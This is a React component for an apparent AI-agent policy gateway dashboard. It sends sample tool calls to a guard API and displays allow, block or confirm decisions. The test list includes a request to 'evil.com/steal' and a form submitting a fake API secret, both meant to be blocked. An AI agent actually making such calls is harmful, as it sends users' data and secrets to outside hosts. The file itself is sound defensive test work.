/**
 * Attack Lab - demonstrates unprotected vs protected agent behavior.
 * Runs the guard decision API for test actions.
 */

import React, { useState } from "react";
import { api, GuardDecision } from "../api";
import { LabelChip } from "../components/LabelChip";

const TEST_ACTIONS = [
  { tool: "navigate", arguments: { url: "http://127.0.0.1:8080/" }, label: "Read-only navigate" },
  { tool: "read_page", arguments: {}, label: "Read page" },
  { tool: "click", arguments: { selector: "button.submit" }, label: "Click button" },
  { tool: "http_request", arguments: { url: "http://127.0.0.1:8080/api/data" }, label: "HTTP request to localhost" },
  { tool: "http_request", arguments: { url: "http://evil.com/steal" }, label: "HTTP request to public (should block)" },
  { tool: "submit_form", arguments: { field: "secret", value: "sk-123456" }, label: "Form with secret (should block)" },
  { tool: "tool_call", arguments: {}, label: "Generic tool call" },
];

export function AttackLab() {
  const [decision, setDecision] = useState<GuardDecision | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [lastAction, setLastAction] = useState<string | null>(null);

  async function runDecision(action: typeof TEST_ACTIONS[number]) {
    setLoading(true);
    setError(null);
    setLastAction(action.label);
    try {
      const d = await api.guardDecide({
        session_id: "attack-lab-demo",
        tool: action.tool,
        arguments: action.arguments,
      });
      setDecision(d);
    } catch (e) {
      setError(e instanceof Error ? e.message : "unknown error");
      setDecision(null);
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="space-y-6">
      <div>
        <h2 className="text-2xl font-bold text-gray-900">Attack Lab</h2>
        <p className="text-gray-600">
          Test agent actions against the policy gateway. Each action is evaluated
          through the real sidecar API ({"/api/v1/guard/decide"}). No tool actually executes.
        </p>
      </div>

      <div className="bg-white border rounded-lg p-4">
        <h3 className="text-sm font-semibold text-gray-700 mb-3">Test Actions</h3>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2">
          {TEST_ACTIONS.map((action) => (
            <button
              key={action.label}
              onClick={() => runDecision(action)}
              disabled={loading}
              className="w-full text-left px-3 py-2 text-xs text-left border rounded hover:bg-gray-100 disabled:opacity-50 text-gray-700"
            >
              {action.label}
            </button>
          ))}
        </div>
      </div>

      {error && (
        <div className="bg-red-50 border border-red-100 rounded-lg p-3">
          <p className="text-sm text-red-700">Error: {error}</p>
        </div>
      )}

      {decision && (
        <div className="bg-white border rounded-lg p-4">
          <h3 className="text-sm font-semibold text-gray-700 mb-2">
            Decision for <span className="font-mono">{lastAction}</span>
          </h3>
          <div className="flex items-center gap-3">
            <span
              className={`inline-flex items-center px-2 py-1 rounded-full text-xs font-medium ${
                decision.decision === "ALLOW" ? "bg-green-100 text-green-700" :
                decision.decision === "BLOCK" ? "bg-red-100 text-red-700" :
                "bg-amber-100 text-amber-700"
              }`}
            >
              {decision.decision}
            </span>
            <LabelChip label={decision.requiresHuman ? "CONFIRM_REQUIRED" : "AUTO_DECIDED"} />
          </div>
          <div className="mt-2 text-sm text-gray-700">
            <p><strong>Reason:</strong> {decision.reasonCode}</p>
            <p><strong>Rules:</strong> {decision.ruleIds.join(", ") || "none"}</p>
            <p><strong>Explanation:</strong> {decision.explanation}</p>
          </div>
          <div className="mt-2 text-xs text-gray-500">
            <p><strong>Blocked:</strong> {decision.blocked ? "YES - tool never executes" : "No"}</p>
            <p><strong>Requires human:</strong> {decision.requiresHuman ? "Yes" : "No"}</p>
          </div>
        </div>
      )}
    </div>
  );
}
